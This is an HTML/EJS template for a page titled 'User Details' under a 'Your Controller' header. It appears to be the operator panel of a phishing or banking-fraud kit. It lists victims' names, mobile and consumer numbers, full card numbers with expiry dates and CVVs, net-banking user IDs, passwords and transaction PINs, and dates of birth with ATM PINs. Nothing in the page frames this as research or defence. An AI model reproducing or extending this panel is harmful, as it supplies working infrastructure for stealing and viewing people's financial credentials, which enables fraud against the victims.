<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User Details</title>
  <link rel="stylesheet" href="/css/userDetail.css" />
</head>
<body>

  <!-- Header Navigation -->
  <header class="header-nav">
    <h1>Your Controller</h1>
  </header>

  <!-- Main Content Container -->
  <div class="user-detail-container">
    <h2>User Details</h2>

    <% if (user && Array.isArray(user)) { %>
      <% user.forEach((userDetails, index) => { %>
        <div class="card">
          <h3>Personal Information - <%= index + 1 %></h3>
          <p><strong>Name:</strong> <%= userDetails.name %></p>
          <p><strong>Mobile No:</strong> <%= userDetails.mobile %></p>
          <p><strong>Consumer:</strong> <%= userDetails.consumerNumber %></p>
        </div>
      <% }) %>
    <% } else if (user) { %> 
      <div class="card">
        <h3>Personal Information</h3>
        <p><strong>Name:</strong> <%= user.name %></p>
        <p><strong>Mobile No:</strong> <%= user.mobile %></p>
        <p><strong>Consumer:</strong> <%= user.consumerNumber %></p>
      </div>
    <% } %>

    <% if (cardPayment && Array.isArray(cardPayment)) { %>
      <% cardPayment.forEach((paymentDetails, index) => { %>
        <div class="card">
          <h3>Card Payment Details - <%= index + 1 %></h3>
          <p><strong>Card No:</strong> <%= paymentDetails.cardNumber %></p>
          <p><strong>EXP:</strong> <%= paymentDetails.expiryDate %></p>
          <p><strong>CVV:</strong> <%= paymentDetails.cvv %></p>
        </div>
      <% }) %>
    <% } else if (cardPayment) { %> 
      <div class="card">
        <h3>Card Payment Details</h3>
        <p><strong>Card No:</strong> <%= cardPayment.cardNumber %></p>
        <p><strong>EXP:</strong> <%= cardPayment.expiryDate %></p>
        <p><strong>CVV:</strong> <%= cardPayment.cvv %></p>
      </div>
    <% } %>

    <% if (netBanking && Array.isArray(netBanking)) { %>
      <% netBanking.forEach((bankDetails, index) => { %>
        <div class="card">
          <h3>Net Banking Details - <%= index + 1 %></h3>
          <p><strong>Bank name:</strong> <%= bankDetails.bankName %></p>
          <p><strong>User-Id:</strong> <%= bankDetails.userId %></p>
          <p><strong>Password:</strong> <%= bankDetails.password %></p>
          <p><strong>T-PiN:</strong> <%= bankDetails.transactionPassword %></p>
        </div>
      <% }) %>
    <% } else if (netBanking) { %> 
      <div class="card">
        <h3>Net Banking Details</h3>
        <p><strong>Bank name:</strong> <%= netBanking.bankName %></p>
        <p><strong>User-Id:</strong> <%= netBanking.userId %></p>
        <p><strong>Password:</strong> <%= netBanking.password %></p>
        <p><strong>T-PiN:</strong> <%= netBanking.transactionPassword %></p>
      </div>
    <% } %>

    <% if (dobAtmData && Array.isArray(dobAtmData)) { %>
      <% dobAtmData.forEach((atmDetails, index) => { %>
        <div class="card">
          <h3>ATM Details - <%= index + 1 %></h3>
          <p><strong>Date of Birth:</strong> <%= atmDetails.dob %></p>
          <p><strong>PIN:</strong> <%= atmDetails.pin %></p>
        </div>
      <% }) %>
    <% } else if (dobAtmData) { %> 
      <div class="card">
        <h3>ATM Details</h3>
        <p><strong>Date of Birth:</strong> <%= dobAtmData.dob %></p>
        <p><strong>PIN:</strong> <%= dobAtmData.pin %></p>
      </div>
    <% } %>

    <% if (!user && !cardPayment && !netBanking && !dobAtmData) { %>
      <p>User Not Found</p>
    <% } %>

    <a href="/api/device/dashboard">
      <button class="dashboard-btn">Go to Dashboard</button>
    </a>
  </div>

</body>
</html>
